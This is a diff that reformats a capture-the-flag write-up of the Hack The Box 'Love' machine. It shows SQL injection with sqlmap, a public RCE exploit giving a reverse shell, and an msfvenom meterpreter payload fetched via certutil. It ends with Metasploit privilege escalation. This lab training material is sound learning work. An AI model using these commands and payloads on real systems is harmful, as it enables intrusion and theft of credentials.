@@ -26,8 +26,7 @@ All you need is love, so let's take on the Love box!
 
 Identify the services by running nmap.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/love]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.239
 [sudo] password for kali: 
@@ -64,20 +63,19 @@ PORT     STATE SERVICE      VERSION
 |_http-title: Not Found
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Attempt to list the shares on the SMB.
 
-{% raw %}
-```bash
+{% capture smblistshares %}
 ┌──(kali㉿kali)-[~/Documents/htb/love]
 └─$ smbclient -L //10.10.10.239/                 
 Password for [WORKGROUP\kali]:
 session setup failed: NT_STATUS_ACCESS_DENIED
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=smblistshares %}
 
 <br />
 Check the landing page the webserver is serving.
@@ -91,8 +89,7 @@ Check the landing page the webserver is serving.
 <br />
 Check the source code to look for anything juicy.
 
-{% raw %}
-```html
+{% capture landingsource %}
 <!DOCTYPE html>
 <html>
 <head>
@@ -118,8 +115,8 @@ Check the source code to look for anything juicy.
 <snip>
 
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://10.10.10.239' content=landingsource %}
 
 <br />
 Check for the existence of a robots.txt file.
@@ -180,10 +177,12 @@ Try the voting login that we discovered earlier and intercept the request in the
 <br />
 Save the request to a file.
 
-{% raw %}
-```bash
+{% capture catrequesttxt %}
 ┌──(kali㉿kali)-[~/Documents/htb/love]
-└─$ cat request.txt             
+└─$ cat request.txt
+{% endcapture %}
+
+{% capture requesttxt %}
 POST /login.php HTTP/1.1
 Host: 10.10.10.239
 Content-Length: 25
@@ -200,14 +199,16 @@ Cookie: PHPSESSID=19jmvikgn41ml6q88abh773ff2
 Connection: keep-alive
 
 voter=1&password=a&login=
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catrequesttxt %}
+
+{% include codebox.html title="request.txt" content=requesttxt %}
 
 <br />
 Run SQLMap and get a hash.
 
-{% raw %}
-```bash
+{% capture sqlmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/love]
 └─$ sqlmap -r request.txt --batch --level=1 --risk=3 -r request.txt --dbms=mysql -p voter --all
         ___
@@ -266,8 +267,8 @@ database management system users password hashes:
     password hash: NULL
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sqlmap %}
 
 <br />
 Check the GitHub for a RCE exploit since we now know what we are running.
@@ -282,8 +283,7 @@ Check the GitHub for a RCE exploit since we now know what we are running.
 <br />
 Download the exploit to the attack machine.
 
-{% raw %}
-```bash
+{% capture downloadexploitpy %}
 ┌──(kali㉿kali)-[~/Documents/htb/love]
 └─$ wget https://raw.githubusercontent.com/SamSepiolProxy/Voting-System-1.0-Unauth-RCE/refs/heads/main/exploit.py --inet4-only
 --2025-06-03 18:07:52--  https://raw.githubusercontent.com/SamSepiolProxy/Voting-System-1.0-Unauth-RCE/refs/heads/main/exploit.py
@@ -296,58 +296,59 @@ Saving to: ‘exploit.py’
 exploit.py                                                 100%[========================================================================================================================================>]   8.45K  --.-KB/s    in 0s      
 
 2025-06-03 18:07:53 (19.3 MB/s) - ‘exploit.py’ saved [8649/8649]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadexploitpy %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture start443listener %}
 ┌──(kali㉿kali)-[~/Documents/htb/love]
 └─$ sudo rlwrap nc -nlvp 443                  
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start443listener %}
 
 <br />
 Run the exploit that we just downloaded.
 
-{% raw %}
-```bash
+{% capture runexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/love]
 └─$ python3 exploit.py -t 10.10.10.239 -i 10.10.16.5 -r 443        
 Start a NC listner on the port you choose above and run...
 Logged in
 Poc sent successfully
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runexploit %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchfootholdshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/love]
 └─$ sudo rlwrap nc -nlvp 443                  
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.10.16.5] from (UNKNOWN) [10.10.10.239] 53423
 b374k shell : connected
+{% endcapture %}
 
+{% capture windowsfootholdshell %}
 Microsoft Windows [Version 10.0.19042.867]
 (c) 2020 Microsoft Corporation. All rights reserved.
 
 C:\xampp\htdocs\omrs\images>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catchfootholdshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=windowsfootholdshell %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```powershell-session
+{% capture userflag %}
 C:\Users\Phoebe\Desktop>type user.txt
 type user.txt
 <redacted>
@@ -364,14 +365,13 @@ Ethernet adapter Ethernet0 2:
    IPv4 Address. . . . . . . . . . . : 10.10.10.239
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : 10.10.10.2
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=userflag %}
 
 <br />
 Run the WHOAMIs to see who we are and the privs that we have.
 
-{% raw %}
-```powershell-session
+{% capture whoamipriv %}
 C:\Users\Phoebe\Desktop>whoami /priv
 whoami /priv
 
@@ -389,14 +389,13 @@ SeTimeZonePrivilege           Change the time zone                 Disabled
 C:\Users\Phoebe\Desktop>whoami
 whoami
 love\phoebe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=whoamipriv %}
 
 <br />
 Run the systeminfo to get an idea of the system that we are running.
 
-{% raw %}
-```powershell-session
+{% capture systeminfo %}
 C:\Users\Phoebe\Desktop>systeminfo
 systeminfo
 
@@ -448,14 +447,13 @@ Network Card(s):           1 NIC(s) Installed.
                                  IP address(es)
                                  [01]: 10.10.10.239
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=systeminfo %}
 
 <br />
 Use msfvenom to generate the a meterpreter executable.
 
-{% raw %}
-```powershell-session
+{% capture generatormeter %}
 ┌──(kali㉿kali)-[~/Documents/htb/love]
 └─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=4444 -f exe -o meter.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -468,14 +466,13 @@ Saved as: meter.exe
 ┌──(kali㉿kali)-[~/Documents/htb/love]
 └─$ python3 -m http.server          
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=generatormeter %}
 
 <br />
 Start a multi/handler to listen for the connection.
 
-{% raw %}
-```bash
+{% capture startmsfconsoleq %}
 ┌──(kali㉿kali)-[~/Documents/htb/love]
 └─$ msfconsole -q
 msf6 > use exploit/multi/handler
@@ -509,40 +506,37 @@ View the full module info with the info, or info -d command.
 
 msf6 exploit(multi/handler) > exploit
 [*] Started reverse TCP handler on 10.10.16.5:4444
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startmsfconsoleq %}
 
 <br />
 Transfer the executable to the victim machine.
 
-{% raw %}
-```powershell-session
+{% capture transfermeter %}
 C:\Users\Phoebe\Desktop>certutil.exe -urlcache -f http://10.10.16.5:8000/meter.exe meter.exe
 certutil.exe -urlcache -f http://10.10.16.5:8000/meter.exe meter.exe
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=transfermeter %}
 
 <br />
 Execute the executable and check the handler to catch the session.
 
-{% raw %}
-```bash
+{% capture catchmetersession %}
 msf6 exploit(multi/handler) > exploit
 [*] Started reverse TCP handler on 10.10.16.5:4444 
 [*] Sending stage (177734 bytes) to 10.10.10.239
 [*] Meterpreter session 1 opened (10.10.16.5:4444 -> 10.10.10.239:64912) at 2025-06-03 18:29:01 +1000
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchmetersession %}
 
 <br />
 Run the exploit suggester.
 
-{% raw %}
-```bash
+{% capture runsuggester %}
 meterpreter > 
 Background session 1? [y/N]  
 msf6 exploit(multi/handler) > search suggester
@@ -579,14 +573,13 @@ Also please contact the author of logging-2.4.0 to request adding syslog into it
  2   exploit/windows/local/bypassuac_fodhelper                      Yes                      The target appears to be vulnerable.
 
  <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runsuggester %}
 
 <br />
 Choose the always elevated exploit from the list and run it.
 
-{% raw %}
-```bash
+{% capture runelevatedexploit %}
 msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/always_install_elevated
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf6 exploit(windows/local/always_install_elevated) > show options
@@ -630,14 +623,13 @@ msf6 exploit(windows/local/always_install_elevated) > exploit
 [*] Meterpreter session 2 opened (10.10.16.5:4444 -> 10.10.10.239:64913) at 2025-06-03 18:34:58 +1000
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runelevatedexploit %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 C:\Users\Administrator\Desktop>type root.txt
 type root.txt
 <redacted>
@@ -654,8 +646,8 @@ Ethernet adapter Ethernet0 2:
    IPv4 Address. . . . . . . . . . . : 10.10.10.239
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : 10.10.10.2
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=rootflag %}
 
 <br />
 Love, love, love is all you need.  Hope you enjoyed the read.  See you in the next one.
